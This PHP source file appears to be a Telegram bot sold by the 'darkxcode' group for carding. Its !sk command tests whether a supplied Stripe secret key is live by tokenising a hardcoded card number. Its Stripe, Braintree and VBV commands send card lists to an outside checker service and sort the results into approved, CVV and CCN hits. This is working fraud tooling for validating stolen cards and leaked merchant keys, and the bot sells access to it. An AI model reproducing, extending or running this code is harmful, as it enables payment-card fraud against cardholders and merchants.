<?php
/*
$ TEAM    : https://instagram.com/darkxcode_
$ AUTHOR  : https://t.me/zlaxtert 
$ CODE    : https://t.me/zexkings 
$ DESIGN  : https://t.me/danielsmt 
$ SITE    : https://darkxcode.site/
$ VERSION : 1.0
*/

// Helper Functions

function startsWith($haystack, $needles) {
    foreach ((array)$needles as $needle) {
        if (strpos($haystack, $needle) === 0) {
            return true;
        }
    }
    return false;
}

function handleSkCommand($message, $chatId, $message_id) {
    $sec = substr($message, 4);
    
    if (empty($sec)) {
        sendMessage($chatId, "Please provide a Stripe key after the command", $message_id);
        return;
    }
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POSTFIELDS => "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2030&card[cvc]=235",
        CURLOPT_USERPWD => $sec . ':',
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded']
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    if (strpos($result, 'api_key_expired')) {
        $msg = "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY";
    } elseif (strpos($result, 'Invalid API Key provided')) {
        $msg = "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY";
    } elseif (strpos($result, 'testmode_charges_only') || strpos($result, 'test_mode_live_card')) {
        $msg = "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only";
    } else {
        $msg = "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!";
    }
    
    sendMessage($chatId, $msg, $message_id);
}


function sendMessage($chatId, $message, $message_id) {
    global $website;
    $url = $website . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message) . "&reply_to_message_id=" . $message_id . "&parse_mode=HTML";
    file_get_contents($url);
}

// Command Handlers

function handleUnknownCommand($chatId, $message_id) {
    $msg = "<b>!! FUCK OFF !!</b> %0A%0A I dont know bruh";
    sendMessage($chatId, $msg, $message_id);
}

function handleStartCommand($chatId, $message_id) {
    $msg = "<b>Hello there!!%0AType /menu to know all commands!!</b>";
    sendMessage($chatId, $msg, $message_id);
}

function handleMenuCommand($chatId, $message_id) {
    $msg = "<b> MENU </b> %0A%0A" .
           "- !info -> for check information %0A" .
           "- !bin -> for check BIN Card %0A" .
           "- !stripe -> for check card gate Stripe %0A" .
           "- !braintree for check card gate Braintree %0A" .
           "- !vbv -> for check card gate VBV Check %0A" .
           "- !sk -> for check SK key %0A" .
           "- !help -> for help information";
    sendMessage($chatId, $msg, $message_id);
}

function handleInfoCommand($chatId, $userId, $firstname, $username, $message_id) {
    $msg = "<u>ID:</u> <code>$userId</code>%0A" .
           "<u>First Name:</u> $firstname%0A" .
           "<u>Username:</u> @$username";
    sendMessage($chatId, $msg, $message_id);
}

function handleHelpCommand($chatId, $userId, $message_id) {
    global $ownerUsername;
    $msg = "Hi <code>$userId</code>, %0A To get the apikey for this bot to work, you can buy it from $ownerUsername";
    sendMessage($chatId, $msg, $message_id);
}

function handleBinCommand($message, $chatId, $username, $message_id) {
    $bin = substr($message, 5, 11);
    
    if (empty($bin)) {
        sendMessage($chatId, "Please provide a BIN after the command", $message_id);
        return;
    }
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://lookup.binlist.net/' . $bin,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        CURLOPT_HTTPHEADER => [
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        ],
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode == 429) {
        sendMessage($chatId, "TOO MANY REQUESTS", $message_id);
        return;
    }
    
    if (strpos($response, '"number":null') !== false || strpos($response, '"number": null') !== false) {
        sendMessage($chatId, "INVALID BIN <b>$bin</b> ❌", $message_id);
        return;
    }
    
    $data = json_decode($response, true);
    
    if (!$data) {
        sendMessage($chatId, "Error processing BIN information", $message_id);
        return;
    }
    
    $scheme = $data['scheme'] ?? 'Unknown';
    $brand = $data['brand'] ?? 'Unknown';
    $bank = $data['bank']['name'] ?? 'Unknown';
    $currency = $data['country']['currency'] ?? 'Unknown';
    $country = $data['country']['name'] ?? 'Unknown';
    $emoji = $data['country']['emoji'] ?? '';
    $type = isset($data['type']) && $data['type'] === 'credit' ? 'Credit card' : 'Debit card';
    
    $msg = '<b>BIN:</b> <code>' . $bin . '</code> 🏧%0A' .
           '<b>STATUS:</b> VALID ✅%0A' .
           '<b>Bank:</b> ' . $bank . ' 🏛️%0A' .
           '<b>Country:</b> ' . $country . '' . $emoji . '%0A' .
           '<b>Brand:</b> ' . $brand . ' ⚜️%0A' .
           '<b>Card:</b> ' . $scheme . ' 💳%0A' .
           '<b>Type:</b> ' . $type . ' 🔰%0A' .
           '<b>Currency:</b> ' . $currency . ' 💰%0A' .
           '<b>Owner:</b> @' . $username . ' 🏴‍☠️';
    
    sendMessage($chatId, $msg, $message_id);
}

function handleStripeCommand($message, $chatId, $message_id) {
    handlePaymentGatewayCommand($message, $chatId, $message_id, 'stripe');
}

function handleBraintreeCommand($message, $chatId, $message_id) {
    handlePaymentGatewayCommand($message, $chatId, $message_id, 'braintree');
}

function handleVbvCommand($message, $chatId, $message_id) {
    handlePaymentGatewayCommand($message, $chatId, $message_id, 'vbv');
}

function handlePaymentGatewayCommand($message, $chatId, $message_id, $gateway) {
    $parts = explode(" ", $message, 3);
    
    if (count($parts) < 3 || empty($parts[1]) || empty($parts[2])) {
        $msg = "INVALID COMMAND ❌%0A%0AFORMAT: /$gateway [cc list] [apikey]";
        sendMessage($chatId, $msg, $message_id);
        return;
    }
    
    $cc = $parts[1];
    $apikey = $parts[2];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.darkxcode.site/checker/cc-checkerV4.5/bot_tele/?cc=$cc&gate=$gateway&apikey=$apikey",
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1
    ]);
    
    $response = curl_exec($ch);
    $data = json_decode($response, true);
    curl_close($ch);
    
    if (!$data || !isset($data['data']['info'])) {
        sendMessage($chatId, "Error processing request", $message_id);
        return;
    }
    
    $info = $data['data']['info'];
    $iniBIN = $info['bin'] ?? '';
    $scheme = strtoupper($info['scheme'] ?? '');
    $bank = $info['bank_name'] ?? '';
    $brand = strtoupper($info['bank_brand'] ?? '');
    $country = $info['country'] ?? '';
    $emoji = $info['emoji'] ?? '';
    $result = $info['msg'] ?? '';
    
    $status = "UNKNOWN ❌";
    $statusMsg = $result;
    
    // Define patterns for different statuses
    $approvedPatterns = [
        'APPROVED', 'SUCCESS', 'APPROV', 'THANK YOU', 'SUCCEEDED',
        '"cvc_check":"pass"', 'cvc_check', '"type":"one-time"', 'one-time'
    ];

    $passedPatterns = [
        'Authenticate Successful', 'Authenticate Attempt Successful', 
        'Authenticate Unavailable', 'Authenticate Unable To Authenticate'
    ];
    
    $cvvPatterns = [
        'transaction_not_allowed', 'Your card zip code is incorrect',
        'incorrect_zip', 'authentication_required',
        'card_error_authentication_required', 'three_d_secure_redirect'
    ];
    
    $ccnPatterns = ['incorrect_cvc', 'invalid_cvc', 'insufficient_funds'];
    
    foreach ($approvedPatterns as $pattern) {
        if (strpos($response, $pattern) !== false) {
            $status = "APPROVED ✅";
            break;
        }
    }

    foreach ($passedPatterns as $pattern) {
        if (strpos($response, $pattern) !== false) {
            $status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅";
            break;
        }
    }
    
    foreach ($cvvPatterns as $pattern) {
        if (strpos($response, $pattern) !== false) {
            $status = "CVV⚠️";
            if ($pattern === 'transaction_not_allowed') {
                $statusMsg = "TRANSACTION NOT ALLOWED";
            } elseif ($pattern === 'authentication_required' || 
                     $pattern === 'card_error_authentication_required') {
                $statusMsg = "AUTHENTICATION REQUIRED";
            } elseif ($pattern === 'three_d_secure_redirect') {
                $statusMsg = "3D Secure";
            }
            break;
        }
    }
    
    foreach ($ccnPatterns as $pattern) {
        if (strpos($response, $pattern) !== false) {
            $status = "CCN⚠️";
            if ($pattern === 'incorrect_cvc') {
                $statusMsg = "INCORRECT CVC";
            } elseif ($pattern === 'invalid_cvc') {
                $statusMsg = "INVALID CVC";
            } elseif ($pattern === 'insufficient_funds') {
                $statusMsg = "INSUFFICIENT FUNDS";
            }
            break;
        }
    }
    
    if (strpos($response, '"status":"failed"') !== false) {
        $status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
    } elseif (strpos($response, 'UNKNOWN RESPONSE!') !== false || empty($scheme)) {
        $status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
        $statusMsg = "TOO MANY REQUESTS, PLEASE WAIT A FEW MINUTES";
    }
    
    $msg = "<b>Status</b> ⇾ $status%0A%0A" .
           "𝗖𝗖 ⇾ $cc 💳%0A" .
           "𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ " . strtoupper($gateway) . "%0A" .
           "𝗥𝗲𝘀𝘂𝗹𝘁 ⇾ $statusMsg ✉️%0A";
    
    if (!empty($scheme)) {
        $msg .= "𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: $iniBIN - $scheme - $brand 🏧%0A" .
                "𝗕𝗮𝗻𝗸: $bank 🏦%0A" .
                "𝗖𝗼𝘂𝗻𝘁𝗿𝘆: $country $emoji%0A";
    }
    
    $msg .= "%0A TYPE: VIP CHECK 🔥%0A OWNER: @zlaxtert 🔰";
    
    sendMessage($chatId, $msg, $message_id);
}
